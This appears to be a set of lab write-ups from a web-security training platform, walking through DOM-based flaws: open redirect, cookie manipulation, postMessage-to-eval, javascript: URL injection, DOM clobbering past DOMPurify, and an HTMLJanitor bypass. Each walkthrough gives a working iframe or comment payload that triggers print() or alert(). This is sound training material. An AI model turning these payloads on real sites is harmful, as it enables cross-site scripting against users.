<img src="images/image1.png" alt="third" width="500">

**Step1**

Click on view post

**Step2:**

View page source

<img src="images/image2.png" alt="third" width="700">

Here we can clearly see the regular expression that check whether the url match the expression if yes then redirect to url otherwise go to home page.

**Step3:**

Go to url of post request and append url with any correct url to check it

**Step4:**

Now append url with the link of exploit server

Like: `&url=https://exploit-0a2e000104a467c480819d6601240080.exploit-server.net/exploit`

<img src="images/image3.png" alt="third" width="500">

Now we redirected to exploit server and lab get solve..
    
<img src="images/image4.png" alt="third" width="500">

**Step1:**

Click on any product

**Step2:**

No inspect the page

<img src="images/image5.png" alt="third" width="500">

Here we can see the lastViewProduct is set to url of product id

**Step3:**

Now go to exploit server and use this payload to
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

<img src="images/image6.png" alt="third" width="500">

**Step1:**

In home we can see an event listener

<img src="images/image7.png" alt="third" width="500">

**Step2:**

Based on this info we construct an exploit

This is vulnerable because an attacker could inject a JavaScript payload by constructing the following iframe:
```
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```

As the event listener does not verify the origin of the message, and the postMessage() method specifies the targetOrigin "*", the event listener accepts the payload and passes it into a sink, in this case, the eval() function.  

We have exploit

  
```
<iframe src="https://0ad700280495d0b885d96c3500c800b7.web-security-academy.net/"

onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')"></iframe>
```

  

Where `https://0ad700280495d0b885d96c3500c800b7.web-security-academy.net` is lab id

<img src="images/image8.png" alt="third" width="500">

**Step1:**

View page source

<img src="images/image9.png" alt="third" width="500">

This script listens for message events sent to the window. When a message is received, it checks if the data contains a URL starting with http: or https:. If it does, the script redirects the browser to that URL using location.href

  
**Step2:**

We use this exploit to solve this

  
```
<!DOCTYPE html>

<html>

<head>

    <title>Exploit</title>

</head>

<body>

    <iframe

        src="https://0a7000d204d48808823ec464000f0024.web-security-academy.net/"

        onload="

            this.contentWindow.postMessage('javascript:print()//https://nothing;', '*');

        "

    ></iframe>

</body>

</html>

``` 

Store it and deliver it to victim

<img src="images/image10.png" alt="third" width="500">

<img src="images/image11.png" alt="third" width="500">

**Step1**

View page source

<img src="images/image12.png" alt="third" width="500">

This script listens for message events and creates a new iframe element when such an event is received. It parses the message data as JSON and performs actions based on the type of data received. If the type is "page-load", it scrolls the iframe into view. If the type is "load-channel", it sets the iframe's source URL to the provided URL. If the type is "player-height-changed", it adjusts the iframe's width and height based on the provided dimensions.

**Step2:**

Write an exploit

```
<iframe

    src="https://lab id url/"

    onload='

        this.contentWindow.postMessage(

            "{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}",

            "*"

        );

    '

></iframe>
```

<img src="images/image13.png" alt="third" width="500">

Store it and deliver it to victim  

<img src="images/image14.png" alt="third" width="500">

**Step1**

View page source and go to loadCommentsWithDomClobbering.js file in file we can see clearly

<img src="images/image15.png" alt="third" width="500">

The defaultAvatar object is implemented using a risky pattern that combines the logical OR operator with a global variable, making it susceptible to DOM clobbering.

You can exploit this vulnerability using anchor tags. By creating two anchors with the same ID, they become grouped in a DOM collection. The name attribute in the second anchor is set to "avatar," which will overwrite the avatar property with the value of the href attribute.

 Although the site employs the DOMPurify filter to mitigate DOM-based vulnerabilities, DOMPurify allows the use of the cid: protocol, which doesn’t URL-encode double quotes. This oversight enables the injection of an encoded double quote that will be decoded at runtime. Consequently, the injection mentioned above will result in the defaultAvatar variable being assigned the clobbered property {avatar: ‘cid:"onerror=alert(1)//’} when the page is reloaded.

  When you make a second post, the browser uses the newly clobbered global variable, which contains the payload in the onerror event handler, triggering the alert().

 **Step2:**

 Go to view post and then post a comment containing

```

   <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

Post the comment

**Step3:**

Again go to post and post any comment this time an alert trigger because an  anchor tag is created.

<img src="images/image16.png" alt="third" width="500">

<img src="images/image17.png" alt="third" width="500">

**Step1:**

Click on view post and then view page source.

**Step2:**

In source code we can see

<img src="images/image18.png" alt="third" width="500">

```
let janitor = new HTMLJanitor({tags: {input:{name:true,type:true,value:true},form:{id:true},i:{},b:{},p:{}}});
```


The provided line of code sets up the janitor object using the HTMLJanitor library, which is configured to only allow certain HTML tags and attributes to pass through its filter. The tags allowed are:

    • input with the name, type, and value attributes.

    • form with the id attribute.

    • i, b, and p tags with no specific attributes allowed
    

**Step3:**

Go to post and post a coment with comment body contain

  
```
<form id="x" tabindex="0" onfocus="print()">

    <input id="attributes">

</form>
```

<img src="images/image19.png" alt="third" width="500">
  
**Step4:**

Go to exploit server and use this payload
```
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

The setTimeout function delays execution by 500 milliseconds (0.5 seconds) and then executes the arrow function.  

The arrow function modifies the iframe’s src attribute by appending #x to it. This effectively causes the iframe to reload with the new URL `(https://YOUR-LAB-ID.web-security-academy.net/post?postId=3#x).`

<img src="images/image20.png" alt="third" width="500">

And the lab get solved.
